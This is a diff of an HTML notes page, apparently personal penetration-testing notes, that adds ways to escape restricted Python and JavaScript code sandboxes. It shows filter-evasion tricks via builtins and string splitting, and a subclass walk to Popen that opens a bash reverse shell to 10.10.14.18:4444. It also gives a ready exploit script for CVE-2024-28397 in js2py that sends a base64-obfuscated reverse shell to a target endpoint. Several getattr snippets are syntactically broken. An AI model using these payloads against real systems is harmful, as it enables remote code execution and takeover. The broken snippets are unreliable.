@@ -23,9 +23,39 @@
             <p>Programming language</p>
         </div>
         <div class="notion-body">
-            <h2>Escape from restricted environment</h2>
+            <h2>Escape from restricted environment (Python IDE)</h2>
+            <p>In some cases you may find that you are in a python environment that ables you to run commands but not all of them. The current case was a python IDE that was web hosted, in that case you could try several things</p>
+            <h3>Introductory</h3>
+            <p>We could try some very basic way of executing commands. This is likely not work since there will be some restricted words</p>
+            <pre><code class="language-python">import os
+os.system("whoami")</code></pre>
+            
+            <h3>Solution 1</h3> 
             <ul>
-                <p>In some cases you may find that you are in a python environment that ables you to run commands but not all of them. The current case was a python IDE that was web hosted, in that case you could try several things</p>
+                <p>We can use built-ins in python which are the keywords that can be used withou having to import any library. This way we could be able to summon the special word <b>import</b></p>
+                <p>We will use <b>getattr</b> which is a function that allow us to access an atribute of an object in a dynamic way. Meaning, using a string with the atribute name instead of writing it literally</p>
+                <p>Using <b>print.__self__</b> which points to builtins we can summon import</p>
+                <pre><code class="language-python">getattr(print.__self__, "__import__")</code></pre>
+                <p>With that we could be able to import os library and save it's content in a variable in order to use it later</p>
+                <pre><code class="language-python">os = getattr(print.__self__, "__import__")("os") </code></pre>
+                <p>Now we could do the same with <b>system</b> and try to execute commands</p>
+                <pre><code class="language-python">getattr(os.'system')('whoami')</code></pre>
+
+                <p>The full code its</p>
+                <pre><code class="language-python">os = getattr(print.__self__, "__import__")("os")
+getattr(os.'system')('whoami')</code></pre>
+
+                <p>In case there are restrictions in the words we are using we can split them all and bypass everything</p>
+                <pre><code class="language-python">os = getattr(print.__self__, "__im" + "port__")("o" + "s")
+getattr(os."sys" + "tem")("whoami")</code></pre>    
+
+
+                
+            </ul>
+            
+            <h3>Solution 2 (Tricky way)</h3>
+            <ul>
+                <p>Print all subclases</p>
                 <pre><code class="language-python">print(object.__subclasses__())</code></pre>
                 <p>Using that listed subclasses we can try to find which one relates to popen</p>
                 <pre><code class="language-python">for i, c in enumerate((()).__class__.__bases__[0].__subclasses__()):
@@ -37,7 +67,38 @@
 cmd = ['bash', '-c', 'bash -i >& /dev/tcp/10.10.14.18/4444 0>&1']
 proc = cls(cmd, stdout=-1, stderr=-1)
 proc.communicate()</code></pre>    
-            </ul>    
+            </ul>
+            <h2>Escape from restricted environment (JS IDE)</h2>
+            <p>In this case we are in an IDE environment but this time we can only code in JS.</p>
+            <b>This can only be exploitable if the server where you run the code has imported a python library called <a class="notion-link">j2py</a></b>
+            <h3>CVE-2024-28397</h3>
+            <p>js2py is a popular python package that can evaluate javascript code inside python interpreter</p>
+            <p>There exists a vulnerability in the implementation of a global variable inside js2py, allowing an attacker obtaining a reference to a python object in the js2py environment, thus enabling the attacker to escape JS environment and execute arbitrary commands on the host.</p>
+            <p>Normally, a user would call js2py.disable_pyimport() to stop JavaScript code from escaping the js2py environment. But with this vulnerability, an attacker can evade this restriction and execute any command on the target host.</p>
+            <p>Here we builded a script to exploit that library for a especific endpoint</p>
+            <pre><code class="language-python">import requests  
+import json  
+  
+url = 'http://10.10.11.82:8000/run_code'  
+  
+js_code = """  
+let cmd = "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTAvNDQ0NCAwPiYxKSAm|base64 -d|bash";  
+let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;  
+let obj = a(a(a,"__class__"), "__base__");  
+function findpopen(o) {  
+    let result;    for(let i in o.__subclasses__()) {        let item = o.__subclasses__()[i];        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {            return item;        }        if(item.__name__ != "type" && (result = findpopen(item))) {            return result;        }    }}  
+let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();  
+console.log(result);  
+result;  
+"""  
+  
+payload = {"code": js_code}  
+  
+headers = {"Content-Type": "application/json"}  
+  
+r = requests.post(url, data=json.dumps(payload), headers=headers)  
+print(r.text)
+</code></pre>
         </div>
     </div>
 
